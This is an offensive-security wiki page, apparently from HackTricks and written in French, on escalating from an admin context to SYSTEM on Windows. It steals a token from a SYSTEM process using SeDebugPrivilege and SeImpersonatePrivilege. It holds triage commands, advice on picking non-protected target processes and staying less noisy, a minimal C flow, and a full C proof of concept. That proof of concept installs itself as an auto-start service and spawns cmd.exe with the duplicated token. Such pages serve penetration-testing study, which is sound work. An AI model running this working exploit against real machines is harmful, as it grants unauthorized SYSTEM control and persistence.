# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Cette page couvre la variante **manual token-theft** où un contexte **High Integrity** qui possède déjà **`SeDebugPrivilege`** et **`SeImpersonatePrivilege`** ouvre un processus **SYSTEM** adapté, **duplique son token**, puis **lance un nouveau processus** avec ce token.

Si vous avez seulement besoin d’un shell **SYSTEM** rapide à partir d’un processus admin privilégié, consultez aussi :

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Si vous n’avez **pas** de chemin via handle de processus, mais que vous avez **`SeImpersonatePrivilege`**, la voie **named-pipe / Potato** est généralement plus simple :

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Avant d’essayer le chemin de copie de token, confirmez que le processus courant est déjà dans un contexte utile :
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes :

- **`SeDebugPrivilege`** est ce qui te permet d’ouvrir de nombreux processus SYSTEM **non protégés**, même lorsque leur DACL te bloquerait normalement.
- **`SeImpersonatePrivilege`** est ce qui rend **`CreateProcessWithTokenW`** pratique ensuite.
- Si le chemin de copie du token ne te donne qu’un token SYSTEM faible ou filtré, vole simplement à partir d’un **autre processus SYSTEM**.

## Choisis le processus cible avec soin

La technique est généralement montrée contre **`lsass.exe`**, mais sur Windows moderne, c’est souvent la **mauvaise cible** :

- Si **LSA Protection / RunAsPPL** est activé, **`lsass.exe`** est protégé et un processus admin normal avec `SeDebugPrivilege` ne pourra toujours pas l’ouvrir.
- Préfère des **processus SYSTEM non-PPL** comme **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, ou une instance **`svchost.exe`** précoce.
- Les **protected processes** et certains processus spéciaux comme **`System`** ou **`csrss.exe`** ne sont pas des cibles réalistes en mode utilisateur pour cette technique.
- Utilise **Process Hacker / Process Explorer** lancé en élevé pour vérifier si le token de la cible possède réellement les privilèges que tu veux avant de le dupliquer.

## Détails API qui comptent en pratique

Beaucoup de PoC publics demandent **`PROCESS_ALL_ACCESS`** et **`TOKEN_ALL_ACCESS`**, mais c’est plus bruyant que nécessaire. En pratique :

- Ouvre le processus cible avec seulement les droits dont tu as besoin (souvent **`PROCESS_QUERY_INFORMATION`** ou **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Ouvre le token avec les droits nécessaires à la création de processus : **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Utilise **`DuplicateTokenEx(..., TokenPrimary, ...)`** pour créer un **primary token** ; un impersonation token seul ne suffit pas pour créer un nouveau processus.
- Si **`CreateProcessWithTokenW`** échoue avec **`1314`**, bascule vers **`CreateProcessAsUserW`**.
- Si tu lances depuis un **service / Session 0**, souviens-toi que **`CreateProcessWithTokenW`** laisse le child dans la **session de l’appelant**. Si tu as besoin d’un desktop shell visible, utilise **`CreateProcessAsUserW`** et déplace le token vers la session voulue.

Un flux minimal moderne ressemble à :
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Le code suivant **exploite les privilèges `SeDebugPrivilege` et `SeImpersonatePrivilege`** pour copier le token depuis un **processus exécuté en tant que SYSTEM** et avec **tous les privilèges du token**. Dans ce cas, le code peut être compilé et utilisé comme un **Windows service binary** pour vérifier que le primitive fonctionne.

La partie principale du **code où l'élévation se produit** se trouve dans la fonction **`Exploit`**. Dans cette fonction, vous pouvez voir que **`lsass.exe`** est recherché, son **token est copié**, puis ce token est utilisé pour lancer un nouveau **`cmd.exe`** avec tous les privilèges du token copié.

Sur les hôtes modernes, vous voudrez souvent remplacer **`lsass.exe`** par un autre **non-PPL SYSTEM process** comme **`winlogon.exe`**, **`wininit.exe`**, ou **`services.exe`**.

D'autres processus exécutés en tant que SYSTEM avec tous ou la plupart des privilèges du token sont : **`services.exe`**, **`svchost.exe`** (certains des premiers), **`wininit.exe`**, **`csrss.exe`**... Rappelez-vous qu'en général, vous **ne pourrez pas copier un token depuis un protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Références

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
